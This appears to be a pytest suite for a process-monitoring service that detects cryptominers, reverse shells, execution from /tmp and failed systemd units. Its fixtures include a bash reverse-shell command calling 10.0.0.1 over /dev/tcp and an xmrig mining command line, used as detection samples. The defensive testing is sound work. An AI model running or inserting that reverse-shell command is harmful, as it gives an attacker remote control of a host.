"""
Automated Test Suite for Phase 25 - Process and Service Monitoring Subsystem
Tests:
- ProcessAnalyzer: Suspicious signature detection (miners, reverse shells, volatile directories)
- ProcessAnalyzer: Resource abuse heuristics (CPU / RAM saturation)
- ProcessAnalyzer: Systemd service failure and critical unit tracking
- ProcessMonitoringService scan execution, process filtering, and stats
- Process REST API endpoints:
  - GET /processes
  - GET /processes/suspicious
  - GET /processes/services
  - GET /processes/alerts
  - GET /processes/stats
  - POST /processes/scan
"""

import pytest
from fastapi.testclient import TestClient

from backend.api.main import app
from backend.process_monitoring.process_analyzer import ProcessAnalyzer
from backend.process_monitoring.process_service import process_service
from backend.auth.jwt_handler import create_access_token


@pytest.fixture
def auth_headers():
    token = create_access_token({
        "sub": "testadmin",
        "role": "admin"
    })
    return {"Authorization": f"Bearer {token}"}


@pytest.fixture
def read_only_headers():
    token = create_access_token({
        "sub": "readonly_user",
        "role": "viewer"
    })
    return {"Authorization": f"Bearer {token}"}


def test_analyzer_detects_cryptominer():
    """Verify cryptominer detection via binary name and cmdline."""
    proc = {
        "pid": 9991,
        "process_name": "xmrig",
        "cmdline": "xmrig --url=stratum+tcp://xmr.pool.com:3333",
        "username": "nobody",
        "cpu_percent": 98.0,
        "memory_percent": 15.0
    }
    result = ProcessAnalyzer.inspect_process(proc)
    assert result["is_suspicious"] is True
    assert result["threat_category"] == "CRYPTOMINER"
    assert result["severity"] == "CRITICAL"


def test_analyzer_detects_reverse_shell():
    """Verify reverse shell detection via interactive shell arguments."""
    proc = {
        "pid": 8882,
        "process_name": "bash",
        "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "username": "www-data",
        "cpu_percent": 2.0,
        "memory_percent": 1.0
    }
    result = ProcessAnalyzer.inspect_process(proc)
    assert result["is_suspicious"] is True
    assert result["threat_category"] == "REVERSE_SHELL"
    assert result["severity"] == "CRITICAL"


def test_analyzer_detects_volatile_dir_execution():
    """Verify detection of binaries executed from /tmp or /dev/shm."""
    proc = {
        "pid": 7773,
        "process_name": "unknown_daemon",
        "cmdline": "/tmp/unknown_daemon --silent",
        "username": "user1",
        "cpu_percent": 5.0,
        "memory_percent": 2.0
    }
    result = ProcessAnalyzer.inspect_process(proc)
    assert result["is_suspicious"] is True
    assert result["threat_category"] == "VOLATILE_EXECUTION"


def test_analyzer_detects_resource_hog():
    """Verify detection of runaway CPU or memory processes."""
    proc = {
        "pid": 6664,
        "process_name": "compute_heavy",
        "cmdline": "python3 worker.py",
        "username": "root",
        "cpu_percent": 95.0,
        "memory_percent": 5.0
    }
    result = ProcessAnalyzer.inspect_process(proc)
    assert result["is_suspicious"] is True
    assert result["threat_category"] == "CPU_EXHAUSTION"


def test_systemd_failure_alerting():
    """Verify that failed critical systemd units generate alerts."""
    service = {
        "service_name": "sshd.service",
        "active_state": "failed",
        "sub_state": "failed",
        "description": "OpenSSH server daemon"
    }
    alert = ProcessAnalyzer.inspect_service(service)
    assert alert is not None
    assert alert["alert_type"] == "CRITICAL_SECURITY_SERVICE_FAILED"
    assert alert["severity"] == "CRITICAL"


def test_process_service_scan():
    """Verify ProcessMonitoringService can run host scans and return metrics."""
    scan_res = process_service.scan_host(hostname="localhost")
    assert scan_res["total_processes"] > 0
    assert "suspicious_count" in scan_res
    assert "services_count" in scan_res

    stats = process_service.get_stats(hostname="localhost")
    assert stats["running_processes_count"] > 0
    assert "systemd_services_count" in stats

    procs = process_service.list_processes(hostname="localhost")
    assert len(procs) > 0

    services = process_service.list_services(hostname="localhost")
    assert len(services) > 0


def test_api_process_monitoring_endpoints(auth_headers, read_only_headers):
    """Verify process monitoring REST endpoints with authentication."""
    client = TestClient(app)

    # 1. Stats
    resp_stats = client.get("/processes/stats", headers=auth_headers)
    assert resp_stats.status_code == 200
    data = resp_stats.json()
    assert "running_processes_count" in data

    # 2. Processes list
    resp_procs = client.get("/processes", headers=auth_headers)
    assert resp_procs.status_code == 200
    procs = resp_procs.json()
    assert isinstance(procs, list)
    assert len(procs) > 0

    # 3. Suspicious filter
    resp_susp = client.get("/processes/suspicious", headers=auth_headers)
    assert resp_susp.status_code == 200
    assert isinstance(resp_susp.json(), list)

    # 4. Systemd services list
    resp_serv = client.get("/processes/services", headers=auth_headers)
    assert resp_serv.status_code == 200
    servs = resp_serv.json()
    assert isinstance(servs, list)
    assert len(servs) > 0

    # 5. Alerts list
    resp_alerts = client.get("/processes/alerts", headers=auth_headers)
    assert resp_alerts.status_code == 200
    alerts = resp_alerts.json()
    assert isinstance(alerts, list)

    # 6. On-demand process scan (Admin role)
    resp_scan = client.post("/processes/scan", json={"hostname": "prac-server"}, headers=auth_headers)
    assert resp_scan.status_code == 200
    assert "total_processes" in resp_scan.json()
